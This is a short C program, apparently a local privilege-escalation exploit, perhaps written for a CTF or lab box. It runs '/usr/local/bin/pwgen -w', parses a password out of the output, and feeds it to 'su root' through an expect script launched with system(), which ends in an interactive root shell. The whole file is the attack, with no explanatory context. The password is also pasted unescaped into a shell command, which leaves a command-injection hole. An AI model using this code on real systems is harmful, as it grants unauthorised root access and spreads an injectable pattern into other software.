#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char buffer[512]; 
    char script[512];
    char *token;
    FILE *pwgen;

    setenv("HOME", "/root", 1);

    // execute pwgen
    pwgen = popen("/usr/local/bin/pwgen -w", "r");
    if (!pwgen) {
        perror("Cannot run pwgen");
        return 1;
    }
    // read pwgen's execution's output
    if (!fgets(buffer, sizeof(buffer), pwgen)) {
        fprintf(stderr, "Cannot read password from pwgen\n");
        pclose(pwgen);
        return 1;
    }
    pclose(pwgen); //close

    // extract password
    token = strtok(buffer, ":");
    token = strtok(NULL, ":");
    token = strtok(token, " ");

    // su root using password
    snprintf(script, sizeof(script), "expect -c 'spawn su root; expect \"Password:\"; send \"%s\\r\"; interact'", token);
    
    system(script); // run script

    return 0;
}
